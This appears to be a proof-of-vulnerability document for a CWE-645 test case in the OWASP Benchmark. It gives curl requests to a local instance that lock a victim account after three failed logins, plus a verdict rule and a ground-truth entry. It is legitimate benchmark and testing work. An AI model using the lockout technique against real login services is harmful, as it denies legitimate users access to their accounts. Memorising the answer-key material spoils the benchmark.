# PoV: CWE-645 Account Lockout Denial of Service

## 1. Machine-readable summary

```json
{
  "document_type": "proof_of_vulnerability",
  "project": "OWASP Benchmark for Java 1.2",
  "test_case": "BenchmarkTestCWE645",
  "cwe": "CWE-645",
  "cwe_name": "Overly Restrictive Account Lockout Mechanism",
  "intentionally_vulnerable": true,
  "endpoint": "POST /benchmark/cwe-645/BenchmarkTestCWE645",
  "parameter": "BenchmarkTestCWE645",
  "parameter_format": "username,password",
  "authentication_required": false,
  "target_username": "victim@example.com",
  "valid_password": "CorrectPassword123!",
  "lock_threshold": 3,
  "impact": "An unauthenticated attacker can prevent the victim from logging in.",
  "proof_condition": "After three invalid attempts, valid credentials return HTTP 403 ACCOUNT LOCKED.",
  "reset_condition": "Restart or redeploy the application JVM."
}
```

## 2. Preconditions

- Run the OWASP Benchmark application locally.
- Base URL: `https://localhost:8443/benchmark`.
- The application may use a self-signed TLS certificate; `curl.exe -k` is used only for this local benchmark.
- Start from a clean JVM so the target account is not already locked.

## 3. Optional baseline check

Send the valid credentials before the attack:

```powershell
curl.exe -k -i -X POST "https://localhost:8443/benchmark/cwe-645/BenchmarkTestCWE645" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  --data-urlencode "BenchmarkTestCWE645=victim@example.com,CorrectPassword123!"
```

Expected result:

```text
HTTP status: 200
Response contains: Login Successful
```

## 4. Attack request

Send this request exactly three times:

```powershell
curl.exe -k -i -X POST "https://localhost:8443/benchmark/cwe-645/BenchmarkTestCWE645" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  --data-urlencode "BenchmarkTestCWE645=victim@example.com,WrongPassword"
```

Expected state transition:

| Attempt | Expected status | Expected result |
|---:|---:|---|
| 1 | 401 | Login failed; account remains usable |
| 2 | 401 | Login failed; account remains usable |
| 3 | 403 | `ACCOUNT LOCKED` |

## 5. Proof request

After the three invalid attempts, send the correct password:

```powershell
curl.exe -k -i -X POST "https://localhost:8443/benchmark/cwe-645/BenchmarkTestCWE645" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  --data-urlencode "BenchmarkTestCWE645=victim@example.com,CorrectPassword123!"
```

Expected vulnerable result:

```text
HTTP status: 403
Response contains: ACCOUNT LOCKED
```

## 6. Verdict rule

```json
{
  "vulnerable_if": {
    "invalid_requests_required": 3,
    "subsequent_valid_login_status": 403,
    "subsequent_valid_login_body_contains": "ACCOUNT LOCKED"
  },
  "not_proven_if": [
    "The subsequent valid login returns HTTP 200",
    "The invalid requests are blocked only for the attacker's source while the victim can still log in",
    "The test starts with an account already locked from a previous run"
  ]
}
```

## 7. Why this proves CWE-645

The failed-attempt counter and locked state are global and keyed only by the username supplied in an unauthenticated request. They are not separated by source IP, session, or device. Therefore, one client can consume the failure allowance of another user's account. Once locked, the servlet checks the locked state before validating the password, so even correct credentials are rejected.

## 8. Evidence locations

```json
{
  "backend": "src/main/java/org/owasp/benchmark/testcode/BenchmarkTestCWE645.java",
  "frontend": "src/main/webapp/cwe-645/BenchmarkTestCWE645.html",
  "ground_truth": "expectedresults-1.2.csv",
  "ground_truth_entry": "BenchmarkTestCWE645,cwe645,true,645"
}
```

## 9. Safety and reset

Run this PoV only against the local OWASP Benchmark instance or another explicitly authorized test environment. The account lock remains for the lifetime of the application JVM. Restart or redeploy the application before repeating the PoV from a clean state.
